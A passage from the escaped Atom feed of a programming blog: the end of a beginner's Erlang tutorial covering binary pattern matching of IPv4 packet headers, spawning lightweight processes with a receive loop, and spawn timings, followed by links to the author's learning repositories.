&lt;li&gt;the next 16 bits must have a value of 2048 (as we expect IPv4)&lt;/li&gt;
&lt;li&gt;the rest are binaries and matched to Rest&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If it succeed, we can easily print the value of those fields. If it doesn’t, it will fall down
to the second declaration which will simply output an error message.&lt;/p&gt;
&lt;h1&gt;Spinning processes with Erlang&lt;/h1&gt;
&lt;p&gt;The next example shows you how you can spin a lot of Erlang processes.
An Erlang process is very small (309 words as stated &lt;a href="http://www.erlang.org/doc/efficiency_guide/processes.html"&gt;here&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;You can easily spawn a process in Erlang using the function spawn.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Module&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Function&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then you would make the created process wait for a message (using Erlang’s message passing) before quitting:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;procc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;fwrite&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;[~p] Process started~n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Id&lt;/span&gt;&lt;span class="p"&gt;]),&lt;/span&gt;
  &lt;span class="n"&gt;receive&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;stop&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
      &lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;fwrite&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;[~p] Process stopped~n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Id&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
  &lt;span class="n"&gt;end&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I’ve been able to spawn 100K processes in less than 30 seconds and 200K processes in about 2 minutes on a i5!&lt;/p&gt;
&lt;p&gt;All the code above is available on github &lt;a href="https://gitlab.com/deadc0de6/erlang-pcap"&gt;here&lt;/a&gt; and
&lt;a href="https://gitlab.com/deadc0de6/erlang-tests"&gt;here&lt;/a&gt;. These were small projects I did to learn the language
so they might have some design flaws and/or errors but it will give you an idea of the language.&lt;/p&gt;
&lt;p&gt;That’s it, hope this little overview made you want to try Erlang!&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This article was first published on &lt;a href="http://cybermashup.com/2015/12/01/getting-started-with-erlang/"&gt;cybersmashup&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;</content><category term="erlang"></category><category term="programming"></category></entry></feed>